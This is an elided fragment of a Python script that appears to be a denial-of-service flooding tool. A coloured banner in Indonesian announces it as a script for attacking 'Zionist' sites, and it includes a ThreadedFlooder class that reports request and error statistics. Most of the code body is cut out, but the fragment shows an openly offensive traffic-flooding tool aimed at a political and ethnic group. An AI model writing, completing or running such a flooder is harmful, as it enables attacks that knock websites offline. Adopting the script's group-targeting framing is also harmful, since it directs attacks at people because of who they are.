...
print("""
  ...
  \033[95m╰─────╯ ╰────╯\033[36m─────────╯\033[33m──────────╯\033[38;5;220m───╯\033[37m─────────╯\033[32m─────────╯\033[38;5;206m╯  ╰───╯""")
print(f"\033[97m  ╔{'═' * 66}╗")
print(f"\033[97m  ║\033[33m{' ' * 20}SCRIPT KHUSUS ATTACK ZI0NIST{' ' * 18}\033[0m║")
print(f"\033[97m  ║\033[33m{' ' * 19}TIDAK UNTUK WEBSITE PEMERINTAH {' ' * 16}\033[0m║")
print(f"\033[97m  ║\033[33m{' ' * 24}_BISI DORAKA MOYANG_{' ' * 22}\033[0m║")
print(f"\033[97m  ╚{'═' * 66}╝")
while attemps < 100:
...
class ThreadedFlooder:
    ...
    def _stats_reporter(self) -> None:
        ...
        while not self._stop.wait(timeout=cfg.stats_interval):
            ...
            logger.info(
                "\033[37mStats: t=%.1fs \033[38;5;220m| req=%d | ok=%d (%.1f%%) \033[32m| err=%d (%.1f%%) [conn=%d] "
